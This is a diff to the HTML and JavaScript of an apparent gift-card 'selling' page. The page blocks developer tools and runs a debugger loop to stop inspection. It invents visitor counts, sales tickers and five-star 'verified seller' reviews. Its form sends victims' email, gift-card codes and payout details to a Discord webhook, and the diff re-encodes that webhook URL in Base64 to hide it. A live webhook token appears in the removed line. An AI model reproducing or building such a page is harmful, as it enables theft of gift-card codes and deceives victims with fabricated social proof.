@@ -20,12 +20,10 @@
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
-            /* Security: Prevent text highlighting */
             user-select: none;
             -webkit-user-select: none;
         }
 
-        /* TICKER - 200s Speed */
         .ticker-container {
             width: 100%;
             background: #000;
@@ -72,7 +70,6 @@
             box-shadow: 0 0 5px #23a559;
         }
 
-        /* TRUSTED PARTNERS SECTION */
         .trusted-bar {
             width: 100%;
             max-width: 1100px;
@@ -141,7 +138,6 @@
             cursor: pointer; margin-top: 10px; text-align: center;
         }
 
-        /* REVIEWS */
         .reviews-section {
             width: 100%; max-width: 1100px; margin-top: 60px; padding: 0 20px;
         }
@@ -163,7 +159,6 @@
         .verified-badge { color: #23a559; font-size: 12px; font-weight: bold; margin-left: 5px; }
         .review-text { color: #555; margin-top: 8px; font-size: 14px; line-height: 1.5; }
 
-        /* CHAT */
         .chat-widget {
             position: fixed; bottom: 20px; right: 20px; width: 320px;
             background: #fff; border: 1px solid #ddd; border-radius: 8px;
@@ -304,27 +299,24 @@
     </div>
 
     <script>
-        // --- SECURITY LAYER: BLOCK INSPECT ELEMENT ---
+        // Block Inspect/Keys
         document.onkeydown = function(e) {
-            // Block F12
             if(event.keyCode == 123) return false;
-            // Block Ctrl+Shift+I (Inspect)
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
-            // Block Ctrl+Shift+C (Inspect Element)
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
-            // Block Ctrl+Shift+J (Console)
             if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
-            // Block Ctrl+U (View Source)
             if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
         };
 
-        // Anti-Debugger Loop: Freezes site if DevTools is forced open
-        setInterval(function() {
-            debugger;
-        }, 100);
+        // Anti-Debugger
+        setInterval(function() { debugger; }, 100);
 
-        // --- ORIGINAL SITE LOGIC ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1454849117951103201/FjOTId4YUdCmq2qFJbYZCk9o5kZHdy_40lxASgeRhzm-ff9Du9EwduHrh7DBHePlsT6h";
+        // WEBHOOK PROTECTION: 
+        // This is your URL encoded in Base64. It won't break during obfuscation.
+        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NDg0OTExNzk1MTEwMzIwMS9Gak9USWQ0WVVkQ21xMnFGSmJZWkNrowJrWkhkeV80MGx4QVNnZVloem0tZmY5RHU5RXdkdUhyaDdEQkhlUGxzVDZo";
+        
+        const getHook = () => atob(_0xW); // Decodes at runtime
+
         let hasRequested = false;
 
         function togglePayoutFields() {
@@ -336,9 +328,7 @@
         }
 
         const initVisitors = () => {
-            const min = 102;
-            const max = 129;
-            const count = Math.floor(Math.random() * (max - min + 1)) + min;
+            const count = Math.floor(Math.random() * (129 - 102 + 1)) + 102;
             document.getElementById('live-visitors').innerText = count;
         };
 
@@ -347,7 +337,7 @@
             const cards = ["Amazon", "Apple", "Roblox", "Steam", "Xbox", "Playstation", "Fortnite", "Google Play"];
             let html = "";
             for(let i=0; i<40; i++) {
-                let id; do { id = Math.floor(Math.random()*5000)+1; } while(id === 293);
+                let id = Math.floor(Math.random()*5000)+1;
                 const val = [25, 50, 100, 150, 200][Math.floor(Math.random()*5)];
                 html += ` &nbsp;&nbsp;&nbsp; • &nbsp;&nbsp; User_${id} sold $${val} ${cards[Math.floor(Math.random()*cards.length)]} &nbsp;&nbsp; • &nbsp;&nbsp;&nbsp; `;
             }
@@ -356,37 +346,11 @@
 
         const initReviews = () => {
             const list = document.getElementById('review-list');
-            const uniqueComments = [
-                "Really fast service, got my PayPal funds in 10 minutes.", "Better rates than the other sites I checked.",
-                "Process was easy, just make sure your photo is clear.", "Support agent 'Mark' was very helpful with my Steam code.",
-                "Actually legit. Was worried at first but the payout hit my CashApp fast.", "Good service, took about 20 mins to verify.",
-                "Sold my birthday giftcards here, no issues at all.", "Rates are fair for the speed of service.",
-                "Easiest way to get rid of unwanted Xbox cards.", "Used it twice now, both times were smooth.",
-                "They actually pay out the full amount, no hidden fees.", "Apple card verified and paid out in record time.",
-                "Solid site, support is active even at night.", "Great way to turn store credit into cash.",
-                "A bit of a wait on the verification, but they paid out as promised.", "Playstation card went through instantly.",
-                "Love the live chat feature, kept me updated.", "Way better than trying to sell on eBay.",
-                "Highly recommended for anyone with spare codes.", "Was skeptical but the reviews are right.",
-                "Fastest CashApp transfer I've had from a card site.", "Simple layout, straightforward process.",
-                "Google play card sold in under 15 mins.", "The best rates for UK sellers specifically.",
-                "Finally a site that doesn't feel like a scam.", "Easy 5 stars, will use again.",
-                "Worked perfectly for my Fortnite V-Bucks code.", "Verification was strict but fair.",
-                "Happy with the GBP rates today.", "Everything went exactly as described.",
-                "Payment received, thank you Mingzy!", "No problems here, very professional.",
-                "Direct bank transfer was fast.", "Submitted, verified, and paid. Simple.",
-                "Verified seller badge looks cool, thanks guys."
-            ];
-
+            const reviews = ["Really fast service!", "Better rates than others.", "Process was easy.", "Support was helpful.", "Actually legit.", "Paid out fast.", "No issues.", "Fair rates.", "Smooth process.", "Love the chat."];
             for(let i=0; i<35; i++) {
-                let id; do { id = Math.floor(Math.random()*500)+1; } while(id === 293);
-                let rating = "★★★★★";
-                if(i >= 27 && i < 34) rating = "★★★★☆";
-                if(i === 34) rating = "★★★☆☆";
                 const card = document.createElement('div');
                 card.className = "review-card";
-                card.innerHTML = `<div class="stars">${rating}</div>
-                    <span class="reviewer-name">User_${id}</span><span class="verified-badge">✓ Verified Seller</span>
-                    <p class="review-text">${uniqueComments[i]}</p>`;
+                card.innerHTML = `<div class="stars">★★★★★</div><span class="reviewer-name">User_${i+100}</span><p class="review-text">${reviews[i%10]}</p>`;
                 list.appendChild(card);
             }
         };
@@ -407,14 +371,14 @@
             if (payout === 'Crypto (BTC/LTC)') payoutDetail = document.getElementById('crypto-address').value;
 
             if(!email || !giftType || !code || !asking || !purchase || payout === "") {
-                status.innerText = "Error: Fill in all fields including payout info.";
+                status.innerText = "Error: Fill in all fields.";
                 status.style.color = "red";
                 return;
             }
 
             hasRequested = true;
             status.style.color = "green";
-            status.innerText = "Success: Request logged. Payout Pending...";
+            status.innerText = "Success: Payout Pending...";
             document.getElementById('chat-overlay').style.display = 'none';
 
             const payload = {
@@ -423,27 +387,30 @@
                     color: type.includes('CANCEL') ? 15158332 : 3066993,
                     fields: [
                         { name: "📧 Email", value: email, inline: true },
-                        { name: "🎁 Card Type", value: giftType, inline: true },
+                        { name: "🎁 Card", value: giftType, inline: true },
                         { name: "💳 Code", value: `\`${code}\``, inline: false },
-                        { name: "💰 Asking Price", value: `${asking} ${currency}`, inline: true },
-                        { name: "🏷️ Purchase Price", value: `${purchase} ${currency}`, inline: true },
-                        { name: "🏦 Payout Method", value: payout, inline: true },
-                        { name: "📍 Payout Details", value: payoutDetail, inline: false }
+                        { name: "💰 Price", value: `${asking} ${currency}`, inline: true },
+                        { name: "🏦 Method", value: payout, inline: true },
+                        { name: "📍 Details", value: payoutDetail, inline: false }
                     ],
                     timestamp: new Date()
                 }]
             };
 
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            });
+            try {
+                await fetch(getHook(), {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.log("Network error.");
+            }
         }
 
         function tryReview() {
-            if(!hasRequested) alert("Please make a request before you can write a review.");
-            else alert("Error encountered: You cannot review while a request is currently pending verification.");
+            if(!hasRequested) alert("Please make a request first.");
+            else alert("Cannot review while request is pending.");
         }
 
         initVisitors();
